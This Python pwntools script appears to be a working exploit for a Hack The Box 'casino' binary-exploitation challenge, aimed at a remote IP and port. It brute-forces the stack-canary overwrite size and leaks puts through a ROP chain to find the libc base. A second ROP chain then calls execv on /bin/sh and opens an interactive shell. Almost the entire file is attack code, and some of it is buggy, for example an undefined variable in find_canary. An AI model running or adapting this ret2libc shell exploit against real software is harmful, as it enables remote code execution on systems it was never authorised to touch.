import ipaddress
import pathlib
import time

import tqdm
from pwnlib import gdb
from pwn import p64, u64
from pwnlib.util.cyclic import cyclic, cyclic_find

from core.gdb_wrapper import GdbApi
from core.target_config import Config, Mode
from core.targetbase import TargetBase
from modules.find_function import FindFunction, Method
from modules.get_libc_address import GetLibcAddress
from pwnlib.tubes.process import process
from abstract.pwntarget import PwnTarget


class CasinoPwn(PwnTarget):
    @classmethod
    def main(cls, proc: process, payload: bytes, pwn_target, *args, **kwargs):
        proc.clean(0.3)
        proc.sendline(payload)

    @classmethod
    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
        return proc.recvline()

    @classmethod
    def find_canary(cls, debugger_api: GdbApi):
        debugger_api.interrupt()
        debugger = debugger_api.api()
        debugger.execute('thread 2')
        debugger.execute('break *last_chance+86')
        debugger.execute('c')
        t.process.sendline(cyclic(0x900))
        rax_value = debugger.execute('i r rax', to_string=True).split()[1]
        rax_value = int(rax_value, 16)
        canary_value = debugger.execute('x/gx $rsp+0x28', to_string=True).split()[1]
        debugger.execute('c')
        canary_value = int(canary_value, 16)
        saved_canary_value = canary_value ^ rax_value
        canary_address = cyclic_find(canary_value)
        cls.logger.success(f'canary_address@{hex(canary_address)}')
        saved_canary_address = cyclic_find(saved_canary_value)
        cls.logger.success(f'saved_canary_address@{hex(saved_canary_address)}')


    def find_canary_alternative(cls, config: Config):
        cls.logger.disable('__main__')
        done = False
        choices = tuple((range(0x10, 0x900 - 0x38 - 0x8, 0x10)))
        t = TargetBase(pwn_target=CasinoPwn, config=config)
        start_address_from_file = t.file.symbols['_start']
        last_chance_address = t.file.symbols['last_chance']

        payload = 0x28 * b'A' + 0x8 * b'U' + 0x8 * b'B'
        with tqdm.tqdm(total=len(choices)) as pbar:
            i = iter(choices)
            address = next(i)
            while address and not done:
                t.process.sendline(b'1 ' + 11 * b'1.\n' + b'1')
                t.process.clean(0.7)
                t.process.sendline(b'.')
                t.process.recvline()
                result = t.process.recvline()
                start_address = int(result.decode().split(' ')[1])
                file_base = start_address - start_address_from_file
                assert file_base > 0x550000000000
                old_data = t.process.clean(0.5)
                if not old_data:
                    old_data = t.process.clean(0.5)
                t.process.send_raw(payload + p64(last_chance_address + file_base) + b'U' * address)
                try:
                    line = t.process.recvline()
                    if not line.startswith(b'***'):
                        next_payload_size = address - 0x8
                        print(old_data)
                        print(line)
                        print(t.process.clean(0.2))
                        done = True
                        break
                except EOFError:
                    pass
                address = next(i)
                pbar.update(1)
                time.sleep(0.2)
                t.reconnect()
        cls.logger.enable('__main__')
        if done:
            cls.logger.success(f'Found size of payload to overwrite stack cookie: {hex(next_payload_size)}')
            t.file.address = file_base
            return next_payload_size, t
        cls.logger.critical("Failed to guess payload size")
        exit(0)


if __name__ == '__main__':
    remote_config = Config(
        rop=True,
        mode=Mode.remote,
        ip=ipaddress.IPv4Address('178.128.172.18'),
        port=31126,
        file=pathlib.Path('/home/lim8en1/htb/projects/casino/challenge/casino'),
        offset=0x28,
        libc='libc6_2.27-3ubuntu1.4_amd64',
        # libc='libc6_2.28-10+deb10u1_amd64',
    )
    payload_size, t = CasinoPwn.find_canary_alternative(remote_config)
    last_chance_address = t.file.symbols['last_chance']
    pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address + t.base_address_fix

    result = FindFunction.execute(t, 'puts', Method.PLT)
    if not result:
        t.logger.critical(f"Failed to get a print function")
        exit(0)
    print_function_name, print_function_address = result
    result = FindFunction.execute(t, 'puts', Method.GOT)
    if not result:
        t.logger.critical(f"Failed to get a print function")
        exit(0)
    target_function_name, target_function_address = result

    t.leave = True
    t.canary = u64(b'U' * 8)

    rop_chain = (
            p64(pop_rdi) +
            p64(target_function_address) +
            p64(print_function_address) +
            p64(last_chance_address)
    )
    payload = t.create_payload(rop_chain)
    # payload += (payload_size - len(payload) - 0x20) * b'K' + p64(t.canary)
    # debugger.interrupt_and_wait()
    # debugger.execute('thread 2')
    # debugger.execute('break *last_chance+86')
    # debugger.execute('c')
    t.process.sendline(payload)
    data = t.process.recvline()[:-1]
    if len(data) > 8:
        t.logger.critical("Unexpected number of bytes received")
        exit(0)
    puts_address = u64(data.ljust(8, b'\0'))
    t.logger.info(f"Leaked libc address: {target_function_name}@{hex(puts_address)}")

    payload_size -= 0x20

    GetLibcAddress.libc_update_base_address(t, [('puts', puts_address)])
    print(t.process.clean())
    pop_rsi = t.rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + t.base_address_fix
    sh_address = next(t.libc.search(b'/bin/sh\0'))
    t.logger.success(f"/bin/sh address: {hex(sh_address)}")
    execv_address = t.libc.symbols['execv']
    t.logger.success(f"Using execv@{hex(execv_address)}")

    rop_chain = (
            p64(pop_rdi) +
            p64(sh_address) +
            p64(pop_rsi) +
            p64(0x0) +
            p64(0x0) +
            p64(execv_address)
    )
    payload = t.create_payload(rop_chain)
    payload = t.create_payload(rop_chain)
    # payload += (payload_size - len(payload) - 0x20) * b'K' + p64(t.canary)
    print(t.process.clean().decode())
    t.process.sendline(payload)
    t.process.interactive()

